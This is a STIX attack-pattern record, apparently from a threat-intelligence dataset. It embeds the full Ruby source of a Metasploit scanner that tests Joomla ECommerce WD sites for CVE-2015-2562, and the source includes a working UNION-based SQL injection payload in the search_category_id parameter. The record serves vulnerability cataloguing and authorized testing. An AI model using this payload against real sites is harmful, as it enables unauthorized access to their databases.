{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a7ad39e-a875-48d1-a055-9db7189e5450",
    "created": "2024-08-14T16:30:55.212773Z",
    "modified": "2024-08-14T16:30:55.212777Z",
    "name": "Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner",
    "description": " This module will scan for hosts vulnerable to an unauthenticated SQL injection within the advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner.rb",
            "external_id": "joomla_ecommercewd_sqli_scanner.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2562"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner',\n      'Description' => %q{\n      This module will scan for hosts vulnerable to an unauthenticated SQL injection within the\n      advanced search feature of the Web-Dorado ECommerce WD 1.2.5 and likely prior.\n      },\n      'Author'       =>\n        [\n          'bperry'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2015-2562']\n        ],\n      'DisclosureDate' => '2015-03-20'))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true,  \"The path to the Joomla install\", '/'])\n        ])\n  end\n\n  def run_host(ip)\n    left_marker = Rex::Text.rand_text_alpha(5)\n    right_marker = Rex::Text.rand_text_alpha(5)\n    flag = Rex::Text.rand_text_alpha(5)\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'vars_get' => {\n        'option' => 'com_ecommercewd',\n        'controller' => 'products',\n        'task' => 'displayproducts',\n        'Itemid' => '-1'\n      },\n      'vars_post' => {\n        'product_id' => '-1',\n        'product_count' => '',\n        'product_parameters_json' => '',\n        'search_name' => '',\n        'search_category_id' => \"1) UNION ALL SELECT CONCAT(0x#{left_marker.unpack(\"H*\")[0]},0x#{flag.unpack(\"H*\")[0]},0x#{right_marker.unpack(\"H*\")[0]})-- \",\n        'filter_filters_opened' => '0',\n        'filter_manufacturer_ids' => '1',\n        'filter_price_from' => '',\n        'filter_price_to' => '',\n        'sort_by' => '',\n        'sort_order' => 'asc',\n        'pagination_limit_start' => '0',\n        'pagination_limit' => '12'\n      }\n    })\n\n    unless res && res.body\n      vprint_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/\n\n    if result\n      print_good(\"Vulnerable to CVE-2015-2562 (search_category_id parameter SQL injection)\")\n      report_vuln({\n        :host  => rhost,\n        :port  => rport,\n        :proto => 'tcp',\n        :name  => \"Web-Dorado ECommerce WD search_category_id SQL injection\",\n        :refs  => self.references.select { |ref| ref.ctx_val == \"2015-2562\" }\n      })\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-20"
}